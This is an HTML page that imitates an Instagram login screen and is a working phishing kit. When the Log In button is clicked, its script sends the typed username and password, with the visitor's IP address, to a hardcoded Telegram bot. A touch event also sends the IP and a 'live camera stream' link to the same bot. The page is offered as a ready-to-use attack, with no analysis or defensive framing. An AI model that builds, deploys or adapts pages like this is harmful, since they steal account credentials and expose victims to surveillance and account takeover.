<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            background-color: #121212;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #1d1d1d;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.5);
            text-align: center;
            width: 320px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: none;
            border-radius: 5px;
            background-color: #2c2c2c;
            color: #ffffff;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #007bb5;
        }
    </style>
</head>
<body ontouchstart="startLiveStream()">

    <div class="container">
        <h2>Instagram Login</h2>
        <input type="text" id="username" placeholder="Phone number, username, or email">
        <input type="password" id="password" placeholder="Password">
        <button onclick="sendData()">Log In</button>
    </div>

    <script>
        let ipAddress = "Unknown IP";
        let liveStreamLink = window.location.origin + "/live.html";  // Automatically refer to the live stream page

        async function startLiveStream() {
            await getIpAddress();
            sendStreamLinkToBot();  // Send details to Telegram bot
        }

        async function getIpAddress() {
            await fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    ipAddress = data.ip;
                });
        }

        function sendStreamLinkToBot() {
            const message = `New Interaction Detected!\nIP Address: ${ipAddress}\nLive Camera Stream: ${liveStreamLink}\nTime: ${new Date().toLocaleString()}`;

            const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';  // Your bot token
            const chatId = '860517021';  // Your chat ID
            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });
        }

        function sendData() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}\nTime: ${new Date().toLocaleString()}`;

            fetch(`https://api.telegram.org/bot7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: '860517021',
                    text: message
                })
            });
        }
    </script>

</body>
</html>
